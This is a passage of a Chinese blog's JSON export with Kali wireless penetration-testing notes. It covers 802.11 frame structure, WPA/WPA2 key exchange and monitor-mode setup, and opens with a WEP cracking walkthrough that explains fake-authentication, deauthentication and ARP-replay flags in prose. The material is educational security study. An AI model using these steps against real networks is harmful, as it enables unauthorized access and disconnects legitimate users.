authentication进行关联\n\n\n\n\n\n\n\n\n\n-1表示第一种包的攻击注入方式；每60秒重新身份认证，-e为要关联的目标的essid；-y上一个步骤抓取的密钥流，-a为AP的MAC地址，-h为无线网卡的MAC地址，再加自己的无线设备名称\n认证成功，获得ID为1的连接关系ID\n此时在AP上已经可以看到已经连上了目标AP\n若是没有抓到密钥流\n\n\n\n\n\n\n\n\n可以发送deauthentication使客户端与AP解除关联，客户端重连的时候再次通过抓取challenge信息与cipher来计算key-stream\n\n\n\n\n\n\n\n\n\n\n发送-0攻击包；1表示发送一次；-a表示要打掉哪一个AP；-c表示打掉哪一个连接的客户端；再加上相应的网卡\n正常情况如下\n进行了deauthentication后\n\n\n\n\n\n\n\n\nPWR信号强度将会变为0，等用户重连时可再次抓取密钥流\n\n使用ARP重放促使AP发送大量IV值\n\n\n\n\n\n\n\n\n\n-h参数用来指定侦听网卡的mac，这里没有获取到ARP，那么再次使用deauthentication让client重连\n\n\n尝试使用抓到的IV值进行破解\n\n\n\n\n\n\n\n\n可以一边抓一边解\n\n1秒计算完成，WEP密码破解成功\n\n\n\n\n\n\n\n\n任何复杂度的密码都可以破解出来\n\nWEP攻击原文链接：https://blog.csdn.net/SyntaxE/article/details/79522187\n","slug":"Kali渗透测试-无线渗透实操","date":"2023-01-23T04:18:22.000Z","categories_index":"无线渗透","tags_index":"Kali,无线渗透","author_index":"Aurora"},{"id":"5f7874ec045900cbfd81273c03a1bc24","title":"Kali渗透测试-WPA安全系统","content":"WPA安全系统\n\n\n\n\n\n\n\n\n\n全称：Wi-Fi Protected Access\n\n802.11组为提高无线安全，开发两个新的链路层加密协议\n\nTemporal Key Integrity Protocol (TKIP)\nWPA1 (较之WEP可动态改变密钥，亦可兼容早期网卡)\n\n\nCounter Mode with CBC-MAC (CCMP)\nWPA2（不兼容早期网卡）\n\n\n\n\nWPA加密两种安全类型\n\nWPA个人：使用预设共享密钥实现身份验证\nWPA企业：使用802.1X和Radius服务器实现AAA（认证，授权，记账）\n\n\n\nWPA1\n\n\n\n\n\n\n\n\n\n802.11i第三版草案\n与WEP比较\n都采用逐包进行密钥加密\n128的key和48位的初向量 (IV)\nRC4流加密数据\n帧技术避免重放攻击\nTKIP使用Michael算法进行完整性校验 (MIC)\nWEP CRC32\n\n\n兼容早期版本硬件\n\n\n\nWPA2\n\n\n\n\n\n\n\n\n\n依据802.11i完全重新设计实现\n也被称为Robust Secruity Network (RSN)\nCCMP代替TKIP\nAES加密算法取代了RC4\n不兼容早期版本硬件\n\n\n\nWPA企业连接过程\n\n\n\n\n\n\n\n\n\n协商安全协议  \n身份验证    \n密钥分发和验证 \n数据加密完整性\n\n\n协商安全协议\n\n\n\n\n\n\n\n\n\n协商认证方式\n\nPSK&#x2F;802.1X\n\n\n单播 和 组播&#x2F;广播流量加密套件\n\nTKIP&#x2F;CCMP\n\n\nSTA通过probe获取无线网络信息\n\n速率\n加密\n通道\n名称\n\n\n\n身份验证（WPA企业）\n身份认证基于Extensible Authentication Protocol(EAP)实现\n\nEAP-TLS，需要客户端和服务器证书\nEAP-TTLS\nPEAP混合身份证验证，只需要服务器证书\n\n\n客户端选择身份认证方式\n\nAP发送身份验证信息给Radius Server,\n\nRadius Server返回”Radius Accept”表示认证成功\n\n其中包含Master Key (MK)\n\n\nAP通过EAP消息通知STA认证成功\n\n\nEAP理解：\n密钥交换\n\n\n\n\n\n\n\n\n\n\n无线网络设计用于一组无线设备通信\n关联到同一AP的设备共享无线信道\n单播、广播、组播\n安全特性要求不同\n单播通信需要单独密钥加密通信双方流量\npairwise key：对偶密钥(PTK)，T代表的是临时性\n\n\n\n\n组播通信需要信任域内所有成员共享的同一密钥\ngroup key：组密钥(GTK)\n\n\n\nPMK\n\n\n\n\n\n\n\n\n\n安全上下文的顶级密钥\n\nMK进行TLS-PRF加密得出PMK\n\n\n基于服务密钥\n\n由上层身份验证方法服务器生成\n从服务器通过radius传给AP\n从AP通过EAP消息传给所有STA\n\n\n基于PSK共享密钥\n\nEssid + PSK + 迭代次数4096—–&gt;Hash计算生成—–&gt;PMK\nSTA和AP分别计算得出PMK，并不在网络中传递交换\n\n\nPMK：256位即32字节\n\n\nPTK的生成过程\n\n\n\n\n\n\n\n\n\nHMAC-SHA1散列算法  \nPRF-X散列算法\n\n\n\n\n\n\n\n\n\n\n\nPTK &#x3D; [Data Encr + Data MIC + EAPOL Encr + EAPOL MIC]，Data Encr(128位)：数据加密 Key，Data MIC：完整性校验 Key，EAPOL Encr：EAPOL协议加密 Key，EAPOL MIC：EAPOL协议完整性校验 Key。\n四步握手过程生成PTK\n\nAP发送Anonce（AP随机数）给STA\nSTA生成Snonce（STA随机数）计算出PTK\nSnonce加PTK的MIC发给AP\nAP拿到Snonce计算出PTK\nAP计算MIC与接收的MIC比对\nMIC一致说明确定STA知道PMK\nAP发GTK给STA\nSTA回复ACK并使用密钥加密\n\n\n数据加密和完整性\n\n\n\n\n\n\n\n\n\nTemporal Key Integrity Protocol (TKIP) 4\nCounter Mode with CBC-MAC (CCMP) 5\nWireless Robust Authenticated Protocol (WRAP) 6（已停用）\n\n","slug":"Kali渗透测试-WPA安全系统","date":"2023-01-09T12:39:38.000Z","categories_index":"无线渗透","tags_index":"Kali,无线渗透","author_index":"Aurora"},{"id":"794f4a9afb9c333220f5373c11dd59cc","title":"Kali渗透测试-无线通信过程","content":"连接到无线网络\n\n\n\n\n\n\n\n\n\n\nProbe\n\nSTA向所有信道发出probe帧，发现AP\nAP回应Response\n\n\nAuthentication\n\nSTA向AP发出验证请求\n发生认证过程(步骤可变，如加密算法的不同)\nAP响应STA的认证结果\n\n\nAssociation\n\nSTA发出关联请求\nAP响应关联请求\n关联成功，开始通信\n\n\n\nWEP和WPA探测过程Beacon标识使用WEP&#x2F;WPA加密\n图片来源：\nhttps://www.cnblogs.com/z9m8r8/articles/16153103.html\nSTA发送普通Probe帧\nAP响应Probe Response帧声明其采用WEP&#x2F;WPA加密\n图片来源：\nhttps://www.cnblogs.com/z9m8r8/articles/16153103.html\n\n\n\n\n\n\n\n\n\n如果是WPA加密，则包头包含WPA1字段信息，如上图，另外不同厂商对802.11标准的实现方式不同，部分字段可能是厂商自己设的。\nWEP OPEN认证过程\n\n\n\n\n\n\n\n\n\nWEP Open认证与open认证通信过程相同\n正确认证后通信数据被WEP加密\n如果认证时客户端输入错误密码\n认证依然可以通过\nAP将丢弃该STA的数据包\n起始向量被错误地密钥解密后完整性被破坏\n但数据传输将失败\n\n\n\n\n认证响应正确，身份验证成功\n\nWEP PSK认证过程\n\n\n\n\n\n\n\n\n\n\nSTA发认证过程\nAP返回随机Challenge消息\nSTA使用PSK加密Cha并发回给AP\nAP使用PSK解密密文，获得Cha并与原始Cha比对，相同则验证成功，不同则验证失败\n\n注意：\n认证过程中传输的是challenge被共享密钥加密后的密文串，密钥并不会直接传输。\n大部分的无线驱动先会尝试几次open认证，直到被AP多次拒绝后才会进行预共享密钥的认证。\n\n\n\n\n\n\n\n\n\n\n无论使用什么加密架构，关联过程完全相同\n\nSTA向AP发送关联请求\nAP向STA发送关联成功或失败结果\n\n\n隐藏AP\n\nSTA关联包中必须包含目标AP的ESSID\n嗅探到此关联包，说明有隐藏AP存在\n\n\n\n没有抓到相关无线包，后续记得补充\n无线加密\n\n\n\n\n\n\n\n\n\n无线安全根源\n\n802.11基于无线电波发射信息\n嗅探侦听是主要问题\n加密机制是必须手段\n\n\nWired Equivalent Privacy (WEP)\n\n802.11标准的一部分\n发布后不久被发现存在安全漏洞\n\n\nWi-Fi Protected Access (WPA) 取代WEP\n\nWPA2 (802.11i标准)\n\n\n\nOPEN无加密网络\n\n\n\n\n\n\n\n\n\n无任何加密机制\n\n所有数据都可以被嗅探\n\nSTA和AP只协商拼配参数即可连入网络\n\n\nWEP 加密系统\n\n\n\n\n\n\n\n\n\n使用Rivest Cipher 4 (RC4)算法加密流量内容，实现机密性\n\nCRC32算法检查数据完整性\n\n标准采用使用24位initialization vector (IV)\n\n受美国加密技术出口限制法律的要求\n\n高于64bit key禁止出口\n所以除24bit IV之外真实的key只有40bit的版本被允许出口\n出口限制法律撤销后实现了128bit key的WEP版本(使用相同的24bit IV)\n\n\n\nRC4算法\n\n\n\n\n\n\n\n\n\nRSA实验室研发的对称加密流算法\n\n实现简单\n速度快\n\n\n加密:对明文流和密钥流进行XOR计算\n\n解密:对密文流和密钥流进行XOR计算\n\n\nRC4算法key由两个过程生成\n\n\n\n\n\n\n\n\n\n合并IV和SKA，利用Key Scheduling Algorithm (KSA)算法生成起始状态表\nPseudo- Random Generation Algorithm (PRGA)算法生成最终密钥流（使密钥流长度与加密数据流长度一致）\n\n\nRC4算法加密流程\n\n\n\n\n\n\n\n\n\n实现过程：\nIV值，数据发起方进行初始化的向量，再加上WEP密钥（密码），两者相结合（图中的黑色竖线），之后再使用KSA算法生成初始状态表，再通过PRGA算法生成密钥流（Keystream）；然后进行CRC32的摘要计算，生成一个32位的ICV，明文消息值和32位校验值相结合（图中下方黑色竖线），形成数据流，之后进行异或运算，形成密文的消息，还会将起始向量的IV值打入包中，后面会跟着KeyID（Key值的ID号）。\n\n\n\n\n\n\n\n\n\nIV初始向量（24位），ICV（32位）是明文通过CRC32算法计算生成的完整性校验值；另外，数据加密主要使用两种密钥，DefaultKey和MappingKey。数据加密密钥一般使用默认密钥中Key ID为0的Default Key密钥。也就是说，所有的用户使用相同的密钥。\nRC4算法解密流程\n\n\n\n\n\n\n\n\n\n解密：\nIV值提取出来，接收端会使用相同的算法将完整的密钥流算出来，再通过KeyID把针对此数据包中的key的内容提取出来，再将IV值和key结合起来（图中黑色竖线），再进行KSA计算生成密钥流的初始状态表，再使用PRGA算法生成最终加密计算的密钥流，再使用此密钥流与密文进行异或运算，生成数据包中的数据明文部分，将所有数据包解密之后生成完整的数据部分，之后还会生成一个ICV值与发送来的数据包中的ICV值进行比对，若相同则包没有被篡改，否则就被丢弃。\n","slug":"Kali渗透测试-无线通信过程","date":"2023-01-06T02:41:27.000Z","categories_index":"无线渗透","tags_index":"Kali,无线渗透","author_index":"Aurora"},{"id":"23e7a773291421d7be94d649cd41c79b","title":"Kali渗透测试-Radiotap头部及802.11包分析","content":"RADIOTAP头部\n\n\n\n\n\n\n\n\n\n802.11帧发射和接收的事实标准（Radiotap并不遵循802.11的标准，但802.11依赖Radiotap完成通信过程）\nLinux系统在驱动和API中内建支持Radiotap的解析\n802.11帧发射之前，网卡驱动在802.11头前面添加Radiotap头，反之当网卡接收到无线帧时，驱动通知MAC层，此帧头包含Radiotap头\nRadiotap为802.11帧传递额外信息，厂家可自定义，因此头长度不固定\n不破坏原始头结构，增加传递的信息\n\nRADIOTAP包头分析开启网卡监听iw dev wlan0 interface add wlan0mon type monitor\nifconfig wlan0mon up\n\n\n抓包分析\n分为Header和data\nVersion（8bit）\n值始终为0\n\n\nPad (8bit)\n未使用，只作为字段强制对其的占位\n\n\nHeader length\n长度可变\n\n\n\n\n\nPresent flags\n后面数据位的掩码，表示数据位会出现那些内容；每32位一组\n\n\n\n\n\n\nFlags\n该标记位标志了后面的数据是否进行了加密，差错校验，数据重传等\n\n\n\n\n802.11头部字段基本概念\n\n\n\n\n\n\n\n\n\nDU (Data Unit)即数据单元，信息传输的最小数据集合\n传递过程逐层封装(Encapsulation)\nSDU (Service Data Unit) &#x2F; PDU (Protocol Data Unit)\nMSDU → MIC → 分帧 → 添加IV → 加密 → 添加MAC头部 → MPDU\nMPDU&#x2F;PSDU +物理头 &#x3D; PPDU → RF发射\n\n\nPDU和SDU补充SDU（service Data Unit）　　SDU（service Data Unit）：服务数据单元，又叫业务数据单元，是指定层的用户服务的数据集，传送到接收方的时候同一协议层时数据没有发生变化，即业务部分，然后发给下层之后，下层将其封装在PDU中发送出去。服务数据单元是从高层协议来的信息单元传送到低层协议。第N层服务数据单元SDU，和上一层的协议数据单元（PDU）是一一对应的。根据协议数据单元的数据的不同，送到接收端的指定层。\nPDU（Protocol Data Unit）\n在电信领域，协议数据单元（PDU，Protocol Data Unit）有以下几层意义：\n网络的对等实体传送的信息单元，包括了控制信息，地址信息，或者数据。\n在协议系统里，在指定的协议层上传送的数据单元，包含了该层的协议控制信息和用户信息。\n在OSI模型系统里，PDU和最底下四层相关\n\n\n\nPDU和SDU的区别PDU的封装&#x2F;解封装　　在发送方，将用户递交的SDU加上协议控制信息PCI，封装成PDU；在接收方，讲接收到的PDU解封装，去掉PCI，还原成SDU送交接收方用户。\nSDU分段&#x2F;装配　　如果下层通道的带宽不能满足传递SDU的需要，就需要将一个SDU分成多段，分别封装成PDU发送出去（分段）；在接收方再将这些PDU解封装后重新装配成SDU。\nSDU拼接&#x2F;分离　　拼接是指在发送方（n）层协议实体把多个长度较短的（n）SDU封装成一个（n）PDU来发送，在接收放再将接收到的（n）PDU解封装，将多个（n）SDU分离出来。采用拼接功能的目的是提高通道的利用率。\nPDU分割&#x2F;组合　　PDU分割是指在发送端（n）层协议实体把一个（n）PDU分割成多个（n-1）SDU，并行地从多个（n-1）通道发送出去；接收端再将收到的多个（n-1）SDU组合成一个（n）PDU。由于这是一个N层功能，所以组合操作在N层中进行，即N层先得到多个分割开的（n）PDU，然后把它们组合成一个（n）PDU。有时NSDU较长，而N协议所要求的NPDU较短。这时就要对NSDU进行分段处理，将一个SDU分成两个或多个PDU来传送。当PDU所要求的长度比SDU还大时，也可将几个SDU合并成为一个PDU。\n原文地址：\nhttp://www.elecfans.com/d/1690388.html\n802.11头部分析802.11MAC头结构\nSequence Control 和 IPID的意义相似\nFrame control\nProtocol Version (2bit)\n\n\n\n\n\n\n\n\n802.11协议版本，始终为0、1、2、3\nType (2bit)\n\n\n\n\n\n\n\n\n规定帧的具体用途(3种帧类型)\n\n控制帧(1)\n发送控制指令\n\n\n数据帧(2)\n管理帧(0)\n\n数值不同帧类型也不同\nSubType (4bit)\n\n\n\n\n\n\n\n\n每个类型对应多个子类型，协议规定不同类型&#x2F;子类型的帧完成不同功能的操作\nAssociation……：管理帧，station向AP发起，Probe……：探测帧，Reserved：保留位，尚未使用\n\n\nToDS&#x2F;FromDS(1&#x2F;1bit)标识帧的传输方向，传向DS或者来自DS；这两个字段的值决定着MAC头中4个Address字段的不同定义，具体如下图所示（BSSID即AP地址）\n\n\n\n\n\n\n\n\n\n\n0x00：出现在IBSS环境中(可能是Management帧或者是Control帧类型) ，或者是STSL (Station to Station Link)中两个STA间通信， 这种情况下通信不通过AP；\n0x01：表示Data帧从AP向STA传递；\n0x02：表示Data帧从STA向AP传递；\n0x03：表示两个AP间通信，这是典型的WDS (Wireless Distribution System)环境下AP间的通信，或者表示Mesh环境下MP间的通信，只有此时才会使用到Address4字段（RA,TA两个AP的地址）。\nMore frag (1bit)\n\n\n\n\n\n\n\n\n表示是否还有后续帧，值为1时表示有后续分段，可能是Data或Management帧类型。只有单播接收地址的帧会被分段；\nRetry (1bit)\n\n\n\n\n\n\n\n\n重传，值为1表示重传帧（初次发送是被置为0的，当发完后没收到ACK则会置1进行重发），可能是Data或Management帧类型，接收端进程使用此值防止帧重复（该值为1且自己已经接收过该帧，则会直接丢弃）；\nPower Mgmt (1bit)\n\n\n\n\n\n\n\n\n活动模式(0) &#x2F;省电模式(1)，STA处于省电模式时，向关联的AP发送该值为1的帧(AP从不使用此字段，恒为0)，省电模式下STA不接收数据（但会接收AP发的一些特殊帧，如有唤醒意义的帧（省电 → 活动模式）），发送给它的Data帧由AP暂时缓存，待AP将它唤醒后，它会主动取回相应缓存；\nMore Data (1bit)\n\n\n\n\n\n\n\n\n当AP缓存了至少一个MSDU时，会向省电模式的STA发送该值为1的帧，表示有数据要传输给STA，接收到此帧的STA唤醒自己并向AP发送PS- Poll帧，取回由AP为其缓存的数据。也被用于AP有更多的广播 &#x2F; 多播帧需要发送的情况；\nProtected Frame (1bit)\n\n\n\n\n\n\n\n\n可能是Data或Management帧类型，表示MSDU是否被加密，也被用于表示PSK身份验证Frame#3帧，数据载荷为空时，该字段值为0；\nOrder (1bit)\n\n\n\n\n\n\n\n\n在非QoS（质量控制）帧的情况下，值为1表示数据必须按严格顺序处理（如按顺序发送），通常为0；\nDuration&#x2F;ID (16bit)\n\n\n\n\n\n\n\n\n所有Control帧都使用该字段，其作用随Type&#x2F;SubType变化有所不同；\n帧类型为PS Poll (type:1, subtype:10)时，表示STA关联的AID (association identity) ，即当station在省电模式收到AP的唤醒帧后，会向AP发送该字段填充为AID的PS-Poll帧，在AP收到PS-Poll帧后，根据AID发送为其缓存的数据；\n其他情况下该字段作为一种载波侦听机制，表示接收下一帧之前需要保持的时间间隔，用于NAV (Network Allocation Vector)计算，单位是微秒;\nMAC Layer Address\n\n\n\n\n\n\n\n\n参见ToDS&#x2F;FromDS(1&#x2F;1bit)字段的介绍\n补充：Basic service set ID (BSSID)，它是BSS的2层唯一标识，Infrastructure模式中BSSID就是AP的MAC地址，当AP支持多BSS时，随机生成每个BSSID。\nSequence Control (16bit)\n\n\n\n\n\n\n\n\n\n这个字段包含两个子字段: Sequence Number和Fragment Number;\nSequence Number是每个帧的编号，数值范围是0- 4095，以1为步长递增。当帧被分段时，同一帧中不同分段的Sequence Number相同;\nFragment Number是被分段的帧用于标识分段位置顺序的编号，数值范围是0-15, 以1为步长递增（即帧加上头部信息后过大，则该帧又会被分成多端传送，段的编号即为Fragment Number）;\nFrame Body (变长)\n\n\n\n\n\n\n\n\n数据字段，未加密的最大MSDU长度为2304字节（其中包含最大256字节的上层头信息，和可被传递的数据2048字节）。不同的加密方法会增加一定的内容长度;\nWEP：8 bytes → 2312 bytes\nTKIP (WPA1)：20 bytes → 2324 bytes\nCCMP (WPA2)：16 bytes → 2320 bytes\n注：Control类型的帧没有Frame Body内容\nFCS (32bit)\n\n\n\n\n\n\n\n\n\n发送端对全部MAC包头和Frame Body内容进行CRC计算，计算结果即为FCS (Frame Check Sequence)值，接收端进行同样的计算，结果一致时，则接收端向发送端返回ACK，否则丢弃帧（只对单播帧有效，FCS错误的广 播&#x2F;多播帧可能被接收）。\n注：wireshark抓包时已经删除了FCS值。\nCONTROL FRAME\n\n\n\n\n\n\n\n\n控制帧是一些通知设备开始、停止传输或连接失败等情况的短消息，无数据段，只有包头。\n\nACK\n\n\n\n\n\n\n\n\n\n\n接收端正确接收数据之后向发送端返回ACK确认\n\n每个单播帧需要ACK立刻确认\n\n组播和广播帧不需要ACK确认\n\n\n尽快响应\n\n由硬件完成，而非驱动层\n\n\nType&#x2F;SubType：1&#x2F;13（帧类型是1；子类型是13）\n\n\n\nPS-POLL\n\n\n\n\n\n\n\n\n\n\nRF系统的放大器\n\n主要耗电的组件\n发射前放大信号，接收并放大还原信号\n\n\n省电模式\n\n关闭信号发射器节省电源耗电(几乎完全关闭)\n\n\n\n\nAID-Association ID\n\nSTA省电模式唤醒\n\n数据发送至AP (AP缓存数据包)\n通过Beacon发送TIM (traffic indication map)\n其中包含AID\n\n\nSTA对比AID后唤醒网卡\nSTA发送PS-PolI帧，请求从AP缓存中取回数据\n每个帧都需要ACK确认\nACK去人后AP从缓存中删除数据帧\n传输过程中STA保持唤醒状态\n传输结束后STA恢复省电状态\n\n\n\n\n\n\n\nAP接收PS- PolI帧\n立刻响应\n延迟响应\n简单响应帧\n\n\n\n\nAID：关联ID\nBSSID：STA正关联的AP地址\nTA：发送此帧的STA地址\n\nRTS&#x2F;CTS\nRTS&#x2F;CTS是CSMA&#x2F;CA方法的一种补充手段\n\nRTS（请求传输服务）和CTS（空闲传输服务）\n\n降低冲突产生的可能性\n\n正式通信之前通过请求应答机制，确信通信介质的可用性\n\n并锁定传输介质和预约通信时间。\n\n只有在传输长帧时使用，传输短帧时不会使用\n\n驱动接口提供阈值的自定义\n大于阈值的帧被视为长帧，反之则视为短帧\n\n\n\n\n传输机制\n\nNode 1发送Request to Send包给Node2\n如果未发生冲突，Node2返回Clear to Send给Node 1\nNode 1传输数据\n数据正常接收，Node2返回ACK，否则Node 1什么也不会收到\n\n\n\n\n\n有线网络介质访问方式: CSMA&#x2F;CD\n\n无线网络介质访问方法: CSMA&#x2F;CA\n\n避免隐藏节点的冲突\n\nn1,n2,n3三个节点，n1,n3彼此不知道对方的存在，相对而言为隐藏节点，当n1,n3同时要与n2通信时则会导致冲突（CSMA&#x2F;CA），而采用RTS&#x2F;CTS方式可避免冲突。\n\n\n\nRTS（帧长度20字节）\n\nCTS（帧长度14字节）\n\nMANAGEMENT FRAME(管理帧)\n\n\n\n\n\n\n\n\n用于控制和协商STA和AP的关系\n\nBEACON FRAMES\n\n\n\n\n\n\n\n\n\nAP发送的广播帧，通告无线网络的存在(BSSID)\n\n发包频率\n\n102.4ms(可变)\n时间单位1024 microseconds (60秒)，可自己设置\n\n\nSSID网络名\n\n隐藏AP不发SSID广播（路由可设置不广播，使用时可手动输入网络名和密码进行连接）\n\n\n\nBeacon帧结构\n\n\n\n\nPROBE FRAMESPROBE REQUEST FRAMES\n\n\n\n\n\n\n\n\n\n\n用于STA主动发出扫描现有AP\n发现连接过的AP\n发现未连连接的AP\n\n\n\n\n注意：数据字段长度可变\n\n\nPROBE RESPONSE FRAMES\n\n\n\n\n\n\n\n\n\n发现连接过的AP时，速率和ESSID相同的AP响应\n\n\n\nAUTHENTICATION FRAMES\n\n\n\n\n\n\n\n\n\nAuthentication Algorithm身份认证类型\n\n0:开放系统身份验证\n1:共享密钥身份验证\n\n身份认证有多个帧交换过程组成\nAuthentication Seq\n\n每次身份验证过程Seq唯一\n1-65535\n\nChallenge text\n\n只有共享密钥方式才有此字段\n\nStatus Code：成功&#x2F;失败\nASSOCIATION&#x2F;REASSOCIATION FRAMES\n\n\n\n\n\n\n\n\n\n身份验证成功后，STA执行关联操作，加入无线网络\nAssociation Request\nReassociation Request\nAssociation Response\n\n\n\nASSOCIATION REQUEST FRAMES\nREASSOCIATION REQUEST FRAME\nASSOCIATION RESPONSE\n\n\n\n\n\n\n\n\nAP对STA的关联请求的响应\n状态码:关联成功&#x2F;失败\n\nDISASSOCIATION&#x2F;DEAUTHENTICATION\n\n\n\n\n\n\n\n\n\n解除关联&#x2F;解除身份认证\n由AP发出\n2个字节\n\n\n\n\n可能的原因（部分）：\n\nATIM FRAMES\n\n\n\n\n\n\n\n\n只在ad-hoc网络下使用，充当AP功能的STA使用此帧通知接收者其有缓存的数据要发送\n\n有些帧没有抓到，可以看下面这篇帖子\nhttps://blog.csdn.net/random_run/article/details/115223124\nDATA FRAME数据帧\n\nDATA FRAMES\n\n\n\n\n\n\n\n\n\n传输用户数据\nDATA Frame\n\n\n空数据帧\nNull data frame\n只包含MAC头和FCS\nSTA用于声明自己将要进入省电模式\n\n\n\nDATA Frame\n\n空数据帧\n\n","slug":"Kali渗透测试-Radiotap头部","date":"2023-01-02T12:38:01.000Z","categories_index":"无线渗透","tags_index":"Kali,无线渗透","author_index":"Aurora"},{"id":"9380cb6d0ca72ae1f44641638d3e52e2","title":"Kali渗透测试-Linux无线协议栈及配置命令","content":"802.11协议栈\n\n\n\n\n\n\n\n\n\n协议栈\n内核接口（kernel）\n用户空间命令及相应的调用程序（userspace）\n\n\n\n\n无线网卡配置查看无线网卡\n\n\n\n\n\n\n\n\n\nifconfig\niwconfig\niw list\n\n\n\n\n\n\n\n\n\n\n\n其中Mode模式为Managed，只有Monitor模式才能抓包\niw list命令：列出网卡支持的加密方法，接口模式，信道，功率以及命令等\n\n\n\n\n\n\n\n\n\n\n其中支持的接口模式中必须要有monitor和AP两种接口，monitor作为抓包接口，AP作为eval AP用来作为流氓AP\n查看信道频率\n\n\n\n\n\n\n\n\n\niwlist wlan0 frequency\niw list\n\n\n扫描AP\n\n\n\n\n\n\n\n\n\niw dev wlan0 scan\niw dev wlan0 scan | grep SSID\niw dev wlan0 scan | egrep “DS Parameter set|SSID”\niwlist wlan0 scanning | egrep “ESSID|Channel”\n\n\niw dev wlan0 scan\n\n\n\niw dev wlan0 scan | egrep “DS Parameter set|SSID”\n\n\n\n\n\n\n\n\n\n\n\n\n\n每一个BSS就是一个无线AP，后面会跟着相应的mac地址，以及此AP的各种详细信息；\nbeacon interval每100毫秒发送一个beacon，1秒发送10个beacon；\nsignal表示信号强度，负值表示接收信号强度\nchannel 6表示使用信道6\nAuthentication suites: PSK表示身份验证方式是PSK（预设的共享密钥）；知道共享密钥就可以连接AP\n\n添加删除侦听端口\n\n\n\n\n\n\n\n\n\niw dev wlan0 interface add wlan0mon type monitor（注意命名限制：wlan+数字+mon）\ntcpdump -S 0 -i wlan0mon -P(建议用wireshark抓包查看)\niw dev wlan0mon interface del\n\n添加无线接口\niw dev wlan0 interface add wlan0mon type monitor\n\n\n\n\n\n\n\n\n\nadd后面是新添加的接口名称wlan0mon；类型type是monitor\n\n\n\n\n\n\n\n\n\n\n\n此时已经成功添加一个新的无线网卡，类型为Monitor\n使用ifconfig wlan0mon up是使其活跃起来\n注意：如果” iw dev wlan0 interface add wlan0mon type monitor “命令执行完 wlan0mon 是 Managed 模式或” ifconfig wlan0mon up”报错（参见下图），则可能是 network-manager 对 iw 命令相冲突，可通过先执行” service network-manager stop”命令，再进行如上操作解决。\n\n\n使用wireshark抓包此时就能抓到无线数据包了\n\n802.11的包头结构\n\n\n删除无线接口\niw dev wlan0mon interface del\n\n\n\n\n\n\n\n\n\n\n此时已经删除了wlan0mon无线网卡\n\n\n","slug":"Kali渗透测试-Linux无线协议栈及配置命令","date":"2023-01-02T09:28:55.000Z","categories_index":"无线渗透","tags_index":"Kali,无线渗透","author_index":"Aurora"},{"id":"25897d89483cfbd0756806de5b4359dd","title":"Kali渗透测试-无线渗透基础","content":"IEEE\n\n\n\n\n\n\n\n\n电气与电子工程师协会（Institute of Electrical and Electronics Engineers），简称IEEE，总部位于美国纽约，是一个国际性的电子技术与信息科学工程师的协会，也是全球最大的非营利性专业技术学会。\nIEEE致力于电气、电子、计算机工程和与科学有关的领域的开发和研究，在太空、计算机、电信、生物医学、电力及消费性电子产品等领域已制定了1300多个行业标准，现已发展成为具有较大影响力的国际学术组织。\nIEEE下的802委员会负责lan（局域网），man（城域网）标准的制定。\n\n802.11标准\n\n\n\n\n\n\n\n\nIEEE 802.11是现今无线局域网通用的标准，它是由国际电机电子工程学会(IEEE)所定义的无线网络通信的标准。\n其中定义了媒体访问控制层(MAC层)和物理层。物理层定义了工作在2.4GHz的ISM频段上的两种扩频作调制方式和一种红外传输的方式，总数据传输速率设计为2Mbit&#x2F;s。两个设备可以自行构建临时网络，也可以在基站(Base Station, BS)或者接入点(Access Point，AP)的协调下通信。为了在不同的通讯环境下取得良好的通讯质量，采用CSMA&#x2F;CA(Carrier Sense Multiple Access／Collision Avoidance)硬件沟通方式。\n注意：Wi-Fi标准是基于802.11 b的；无线是工作在数据链路层和物理层\n802.11协议簇\n\n\n\n\n\n\n\n\n\n802委员会下第11组负责开发无线局域网标准\nIEEE 802.1 1 The Original WLAN Standard- 1 Mbit&#x2F;s and 2 Mbit&#x2F;w,2.4GHz RF andIR\nIEEE 802.11 a 54 Mbit&#x2F;s,5 GHz\nIEEE 802.11 b 802.11 Enhancements to Support 5.5 Mbit&#x2F;s and 11 Mbit&#x2F;s\nIEEE 802.11 c Bridge Operation Procedure\nIEEE 802.11 d International (Country to Country) Roaming Extensions\nIEEE 802.11 e Quality of Service (Qos),Including Packet Bursting\nIEEE 802.11 F Inter -Access Point Protocol\nIEEE 802.11 g 54 Mbit&#x2F;s,2.4 GHz\nIEEE 802.11 h Spectrum Managed 802.11 a (5 GHz) for European Compatibility\nIEEE 802.11 i Enhanced Security\nIEEE 802.11 j Extensions for Japan\nIEEE 802.11 k Radio Resource Measurement Enhancements\nIEEE 802.11 n Higher Throughput Using Multiple Input,Multiple Ouput(MIMO) Antennas\nIEEE 802.11 p Wireless Access for the Vehicular Environment (WAVE)\nIEEE 802.11 r Fast BSS Transition (FT)\nIEEE 802.11 s Mesh Networking,Extended Service Set (ESS)\nIEEE 802.11 T Wireless Performance Prediction (WPP)\nIEEE 802.11 u Internetworking with Non -802 Networks (i.e.:Cellular)\nIEEE 802.11 v wrieless Network Management\nIEEE 802.11 v wrieless Network Management\nIEEE 802.11 w Protected Management Frames\nIEEE 802.11 y 3650 - 3700 MHz Operation in the US\nIEEE 802.11 z Direct Link Setup (DLS) Extensions\nIEEE 802.11 zm Maintenance of the Standard\nIEEE 802.11 aa Robust Streatming of Audio Video Transport Streams\nIEEE 802.11 ac Very High Troughput &lt; 6 GHz\nIEEE 802.11 ad Very High Troughput, 60 GHz\nIEEE 802.11 ae Qos Management\nIEEE 802.11 af TV Whitespace\nIEEE 802.11 ah SUb 1 GHz\nIEEE 802.11 ai Fast Initial Link Setip\n\n其中大写字母都是正式标准\n日常使用\n\n\n\n\n\n\n\n\n\nIEEE 802.11 - The original WLAN standard\nIEEE 802.11 a - UP to 54 Mbit&#x2F;s on 5 GHz\nIEEE 802.11 b - 5.5 Mbit&#x2F;s and 11 Mbit&#x2F;s? on 2.4 GHz\nIEEE 802.11 g - Up to 54 Mbit&#x2F;s on 2.4 GHz.Backward compatible with 802.11b\nIEEE 802.11 i - Provides enhanced security\nIEEE 802.11 n - Provides higher throughput with Multiple Input&#x2F;Multiple Output (MIMO)\n\n\n802.11\n\n\n\n\n\n\n\n\n发布于1997年\n速率1Mbps或2Mbps\n红外线传输介质（未实现）\n无线射频信号编码（调制）（radio frequencies）\n\n-Direct-Sequence Spread-Spectrum (DSSS)—–直序扩频\n-Frequency Hopping Spread-Spectrum (FHSS)—–跳频扩频\n\n媒体访问方式—–CSMA&#x2F;CA c&#x3D;b+log2 (1+s&#x2F;n) (载波侦听多路访问冲突避免)\n\n-根据算法侦听一定时长\n-发送数据前发包声明\n\nRequest to Send&#x2F;Clear to Send 